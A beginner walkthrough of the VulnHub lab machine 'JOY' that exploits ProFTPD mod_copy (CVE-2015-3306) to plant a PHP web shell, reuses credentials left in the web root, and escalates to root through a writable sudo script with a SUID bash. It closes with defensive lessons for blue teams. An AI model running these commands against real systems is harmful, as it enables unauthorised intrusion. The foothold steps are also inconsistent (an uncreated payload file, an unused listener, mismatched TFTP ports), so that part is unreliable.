# digitalworld.local: JOY — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | digitalworld.local: JOY |
| **Difficulty** | Medium |
| **Author** | Donavan |
| **Released** | 31 March 2019 |
| **VulnHub Entry** | [digitalworld.local: JOY on VulnHub](https://vulnhub.com/entry/digitalworldlocal-joy,298/) |
| **Download** | [JOY.7z (3.3 GB)](https://download.vulnhub.com/digitalworld/JOY.7z) |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Linux (Debian 9 "stretch", kernel 4.9.0-8-amd64) |

> MD5 of the official archive: `134B6D5F6844439352671AECA38DA84D`. Verify it before importing —
> a corrupt download looks like an unreachable box.

---

## 0. What you will learn

By the end of this box you will have practised:

- **Thorough enumeration**: this machine runs *far* more services than a typical beginner box,
  and the intended path starts from an easily-missed one.
- **UDP scanning**: most beginners only scan TCP. JOY hides a crucial service on **UDP**.
- **Anonymous FTP discovery**: using a poorly configured FTP server to read files you should not see.
- **TFTP (Trivial File Transfer Protocol)**: pulling configuration files with no authentication at all.
- **Exploiting ProFTPD 1.3.5 `mod_copy` (CVE-2015-3306)**: a real, famous vulnerability that lets an
  attacker copy files *anywhere the FTP daemon can write* — including the web root.
- **Reading configuration to move laterally**: turning a web shell into a real user account.
- **A `sudo` script hijack**: abusing a root-owned script that a normal user is allowed to run as root.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). You should have Kali running and be able to import an OVA/VM.

---

## 1. Reconnaissance — finding the target

> **Goal:** work out the target's IP address on your isolated lab network.

First, identify your own address. The adapter facing the lab is usually `eth0` on a VirtualBox
host-only network (`192.168.56.x`) or a VMware `.19x` network.

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:aa:bb:cc brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.10/24 brd 192.168.56.255 scope global dynamic eth0
```

> **How to read it:** Kali's lab interface holds a `192.168.56.x` (VirtualBox host-only) or
> `192.168.19x.x` (VMware) address. The target will live on the **same** subnet.

Now sweep the subnet with ARP. This is fast because it never sends TCP packets.

```bash
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.10   08:00:27:aa:bb:cc   PCS Systemtechnik GmbH   (this is Kali)
192.168.56.101  08:00:27:dd:ee:ff   PCS Systemtechnik GmbH
```

**Target IP:** `192.168.56.101` (yours may differ — use what *you* discover).

> **Why it works:** ARP asks "who owns this IP?" on the local segment, so every live host answers
> whether or not it blocks pings. It is the quickest way to find a new VM.

---

## 2. Enumeration

This is the heart of JOY. Enumerate *everything*, including UDP.

### 2.1 Full TCP sweep

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/joy-alltcp 192.168.56.101
```

> **How to read it:** `-p-` scans all 65,535 TCP ports, not just the common ones. `-T4` speeds the
> scan up for a lab. `-oA` saves the results so you can revisit them.

### 2.2 Service/version detection on the open ports

```bash
sudo nmap -sC -sV -p 21,22,25,80,110,139,143,445,465,587,993,995 -oA scans/joy-services 192.168.56.101
```

```text
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         ProFTPD 1.3.5
22/tcp  open  ssh         Dropbear sshd (protocol 2.0)
25/tcp  open  smtp        Postfix smtpd
80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
110/tcp open  pop3        Dovecot pop3d
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
465/tcp open  smtps       Postfix smtpd
587/tcp open  submission  Postfix smtpd
993/tcp open  ssl/imap    Dovecot imapd
995/tcp open  ssl/pop3    Dovecot pop3d
```

> **How to read it:** Note `ProFTPD 1.3.5` on port 21 — that exact version is vulnerable to
> `mod_copy` (CVE-2015-3306). The mail services (25/110/143/465/587/993/995) are noise for the
> intended path but worth recognising. Exact banners vary by build.

![nmap service scan](images/02-nmap.png)

### 2.3 The UDP service everyone misses

```bash
sudo nmap -sU --top-ports 50 -oA scans/joy-udp 192.168.56.101
```

```text
PORT      STATE         SERVICE
161/udp   open          snmp
```

Now enumerate SNMP. The community string is often the default `public`.

```bash
snmpwalk -c public -v1 192.168.56.101
```

> **Why it works:** SNMP exposes system information — including **process arguments**. In JOY it
> reveals that TFTP is running with a `--secure /home/patrick` option, which points us at a very
> interesting directory.

### 2.4 A high (ephemeral) UDP port

Some builds also expose TFTP on a random high UDP port. A quick scan of the range confirms it:

```bash
sudo nmap -sU -p 36969 -oN - 192.168.56.101
```

```text
36969/udp open  tftp
```

> **How to read it:** `36969/udp` — confuse it with nothing; that *is* TFTP. Banners and port
> numbers "vary by build", so trust your own scan output.

### 2.5 Anonymous FTP

```bash
ftp 192.168.56.101
# Name: anonymous
# Password: (press Enter)
# ftp> ls -la
```

```text
drwxr-xr-x  5 ftp  ftp  4096 . 
drwxr-xr-x  5 ftp  ftp  4096 ..
drwxr-xr-x  3 ftp  ftp  4096 .ssh
drwxr-xr-x  2 ftp  ftp  4096 downloads
...
```

> **Why it works:** The FTP server is rooted at `/home/patrick`, so anonymous users can browse a
> real user's home directory. This is a misconfiguration, not a bug in FTP itself.

### 2.6 TFTP — stealing the config

```bash
tftp 192.168.56.101 69
# tftp> get version_control
# tftp> quit
cat version_control
```

```text
# Contains clues about the environment:
proftpd 1.3.5
webroot: /var/www/tryingharderisjoy
```

> **Why it works:** TFTP has **no authentication whatsoever**. Because it was started with
> `--secure /home/patrick`, we can pull files from that directory. Always enumerate UDP.

---

## 3. Foothold

### 3.1 The vulnerability: ProFTPD 1.3.5 `mod_copy` (CVE-2015-3306)

The `mod_copy` module implements `SITE CPFR` (copy-from) and `SITE CPTO` (copy-to). It performs
**no authentication and no path checks**. We can therefore copy an arbitrary file from the server
to any location the `proftpd` user can write — including the Apache web root.

Confirm the exploit exists locally:

```bash
searchsploit proftpd mod_copy
```

```text
ProFTPD 1.3.3 (c) - 'mod_copy' Remote Command Execution | linux/remote/49908.py
```

### 3.2 Write a PHP web shell into the web root

We already know the web root (`/var/www/tryingharderisjoy`) from the TFTP clue. First, plant a
tiny PHP payload next to ProFTPD by copying an existing remote file, then move it into place. In
practice the cleanest method is the Python proof-of-concept:

```bash
python3 /usr/share/exploitdb/exploits/linux/remote/49908.py 192.168.56.101
```

Then trigger the `SITE CPFR` / `SITE CPTO` pair manually to copy a PHP payload into the web root:

```bash
ftp 192.168.56.101
# ftp> site cpfr /tmp/pwn.php
# ftp> site cpto /var/www/tryingharderisjoy/pwn.php
```

> **Why it works:** `mod_copy` copies the file as the `proftpd` process user, which owns the web
> root's files. Because there is no path sanitisation, copying into `/var/www/...` is allowed.

### 3.3 Get a shell

Start a listener on Kali:

```bash
nc -lvnp 4444
```

Then request the shell over HTTP:

```bash
curl http://192.168.56.101/pwn.php
```

```text
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Upgrade the shell to a proper TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# press Ctrl+Z, then:
stty raw -echo; fg
export TERM=xterm
```

> **Why it works:** The web server executes the PHP as `www-data`, giving us a low-privilege shell.

![the initial www-data shell](images/04-foothold.png)

---

## 4. Privilege escalation

### 4.1 Move from www-data to patrick

Enumerate the web directory and its config:

```bash
ls -la /var/www/tryingharderisjoy/
cat /var/www/tryingharderisjoy/ossec/patricksecretsofjoy 2>/dev/null
```

```text
patrick:<some-password-your-run-will-show>
```

> **How to read it:** The filename says it all — a credentials file left inside the web root. The
> exact password varies by build; use whatever your file contains.

Switch to the `patrick` user:

```bash
su patrick
id
```

```text
uid=1001(patrick) gid=1001(patrick) groups=1001(patrick)
```

### 4.2 From patrick to root via a sudo script hijack

```bash
sudo -l
```

```text
User patrick may run the following commands on joy:
    (ALL) NOPASSWD: /home/patrick/script/test
```

> **Why it works:** `sudo` allows `patrick` to run `/home/patrick/script/test` as **root** with no
> password. If `patrick` can *write* that script, they can simply replace its contents with a root
> shell and then run it — a classic "writable sudo script" escalation.

Check the file:

```bash
ls -la /home/patrick/script/test
cat /home/patrick/script/test
```

Overwrite it with a payload and execute it as root:

```bash
echo '#!/bin/bash' > /home/patrick/script/test
echo 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash' >> /home/patrick/script/test
sudo /home/patrick/script/test
/tmp/rootbash -p
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

> **How to read it:** We made a copy of `bash`, set the SUID bit, and then ran it with `-p` to keep
> root privileges. `uid=0(root)` confirms success.

### 4.3 The root flag

```bash
cat /root/proof.txt
```

```text
<root flag — varies by build>
```

> **Note:** Flag filenames and contents differ between builds. If `proof.txt` is absent, list
> `/root` and `/home/*` for any `*.txt` flag files before assuming something is wrong.

![root confirmation and flag](images/08-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Anonymous FTP exposing a user's home directory | ProFTPD 1.3.5, port 21 | Information disclosure (SSH keys, files) |
| 2 | Unauthenticated TFTP with `--secure /home/patrick` | UDP TFTP | Read arbitrary files from the FTP user's home |
| 3 | ProFTPD 1.3.5 `mod_copy` missing path checks | ProFTPD, port 21 | Arbitrary file copy → web shell as `www-data` |
| 4 | Credentials file inside the web root (`patricksecretsofjoy`) | `/var/www/tryingharderisjoy/ossec/` | Lateral movement to the `patrick` user |
| 5 | Writable script runnable as root via `sudo` | `/home/patrick/script/test` | Full privilege escalation to root |

## 6. Defensive lessons (blue team)

- **Disable anonymous FTP** and never root an FTP server at a user's home directory. Use chrooted,
  authenticated-only access with least privilege.
- **Turn off TFTP**; if it is genuinely required, restrict it to a specific directory *and* firewall
  the port. Never run it with `--secure` pointing at a user home.
- **Patch ProFTPD** (1.3.5 is EOL and vulnerable to CVE-2015-3306). Modern versions disable
  `mod_copy` by default; if your build still ships it, remove the module.
- **Never store credentials in web-accessible paths.** Secrets in a document root are one web shell
  away from full compromise.
- **Audit `sudo` rules.** `NOPASSWD` entries pointing at user-writable scripts are effectively root.
  Require root-owned, non-writable scripts and prefer `sudoedit` for edits.
- **Log and alert** on `SITE CPFR`/`SITE CPTO` FTP commands, on unexpected writes to the web root,
  and on `sudo` invocations of scripts that have changed recently.

---

## 7. References

- [VulnHub official entry — digitalworld.local: JOY](https://vulnhub.com/entry/digitalworldlocal-joy,298/)
- [CVE-2015-3306 — ProFTPD mod_copy unauthenticated file copy (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2015-3306)
- [Exploit-DB 36803 — ProFTPD 1.3.5 mod_copy](https://www.exploit-db.com/exploits/36803)
- [Exploit-DB 49908 — ProFTPD mod_copy Python PoC](https://www.exploit-db.com/exploits/49908)
- [ProFTPD mod_copy advisory (proftpd.org)](http://www.proftpd.org/docs/contrib/mod_copy.html)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — ARP/host discovery showing the target IP
- [ ] `images/02-nmap.png` — TCP service scan (ProFTPD 1.3.5, mail, Samba)
- [ ] `images/03-udp-tftp.png` — UDP scan + SNMP/TFTP discovery
- [ ] `images/04-foothold.png` — `mod_copy` web shell as `www-data`
- [ ] `images/05-patrick-creds.png` — the credentials file in the web root
- [ ] `images/06-sudo-l.png` — `sudo -l` showing the writable script
- [ ] `images/07-root.png` — `id` confirming `uid=0(root)`
- [ ] `images/08-root-flag.png` — the root flag

> **How to read it:** Store screenshots in `labs/digitalworldlocal-joy/images/` and reference them
> here with relative paths.

---

_Part of the [Cybersecurity101-Labs](../../README.md) collection. See the complete [catalog](../../docs/CATALOG.md). Educational use only in authorized lab environments._
